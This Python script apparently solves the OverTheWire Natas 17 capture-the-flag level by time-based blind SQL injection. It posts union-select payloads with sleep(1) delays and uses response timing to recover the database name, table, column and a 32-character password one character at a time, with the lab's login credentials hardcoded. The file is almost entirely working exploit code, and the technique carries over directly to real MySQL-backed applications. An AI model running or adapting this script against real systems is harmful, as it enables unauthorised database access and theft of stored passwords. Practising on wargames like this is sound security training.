from datetime import datetime
import requests

def fl(url,username,password,len_alphanum,table,column):
    print("Extracting password:")
    alpha_num = "812345679abcdefghijklmnopqrstuwvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0" 
    flag = ""
    letter = 0
    while letter < len_alphanum:
        start_time = datetime.now()
        post_data = {
            "username":"\" union select 1,2 from " + table + " where " + column + " like binary '"+ flag + alpha_num[letter] + "%' and sleep(1)-- -",
            }
        sqli_r = requests.post(url,auth=(username,password),data=post_data)
        end_time = datetime.now()
        difference = end_time - start_time
        if difference.total_seconds() > 1 and difference.total_seconds() < 2:
            flag = flag + alpha_num[letter]
            letter = 0
        else:
            letter += 1
    if len(flag) != 32:
        fl(url,username,password,len_alphanum,table,column)
    else:
        print("The flag for natas17 is: " + flag) 

def cols(url,username,password,alpha_num,len_alphanum,database,table):
    column = ""
    letter = 0
    while letter < len_alphanum:
        start_time = datetime.now()
        post_data = {
            "username":"\" union select 1,2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='" + database + "' and TABLE_NAME='" + table + "' and COLUMN_NAME like binary '" + column + alpha_num[letter] + "%' and sleep(1)-- -",
            }
        sqli_r = requests.post(url,auth=(username,password),data=post_data)
        end_time = datetime.now()
        difference = end_time - start_time
        if difference.total_seconds() > 1 and difference.total_seconds() < 2: 
            column = column + alpha_num[letter]
            letter = 0
        else:
            letter += 1        
    if column != "password":
        cols(url,username,password,alpha_num,len_alphanum,database,table)
    else:
        print("Column is: " + column)
        print("Getting flag for natas17:")
        fl(url,username,password,len_alphanum,table,column)

def tables(url,username,password,alpha_num,len_alphanum,database):
    table = ""
    letter = 0
    while letter < len_alphanum: 
        start_time = datetime.now()
        post_data = {
            "username":"\" union select 1,2 FROM information_schema.tables WHERE table_schema = '" + database + "' and table_name like binary '" + table + alpha_num[letter] + "%' and sleep(1)-- -",
            }
        sqli_r = requests.post(url,auth=(username,password),data=post_data)
        end_time = datetime.now()
        difference = end_time - start_time
        if difference.total_seconds() > 1 and difference.total_seconds() < 2:
            table = table + alpha_num[letter]
            letter = 0
        else:
            letter += 1
    if table != "users":
        tables(url,username,password,alpha_num,len_alphanum,database)
    else:
        print("Table is: " + table)
        print("Getting column")
        cols(url,username,password,alpha_num,len_alphanum,database,table)

def db(url,username,password):
    site = requests.get(url,auth=(username,password))
    alpha_num = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" 
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    len_alphanum = len(alpha_num)
    database = ""
    letter = 0
    while letter < len_alphanum:
        start_time = datetime.now()
        post_data = {
            "username":"\" union select 1,2 where database() like binary '" + database + alpha_num[letter] + "%' and sleep(1)-- -",
            }
        sqli_r = requests.post(url,auth=(username,password),data=post_data)
        end_time = datetime.now()
        difference = end_time - start_time
        if difference.total_seconds() > 1 and difference.total_seconds() < 2: 
            database = database + alpha_num[letter]
            letter = 0
        else:
            letter += 1
    if database != "natas17":
        db(url,username,password)
    else:
        print("Database is: " + database)
        print("Getting table")
        tables(url,username,password,alpha_num,len_alphanum,database)

if __name__=="__main__":
    print("Natas 17: Time based SQL Injection. Patience...")
    url = "http://natas17.natas.labs.overthewire.org/"
    username = "natas17"
    password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
    print("Getting database")
    db(url,username,password)
    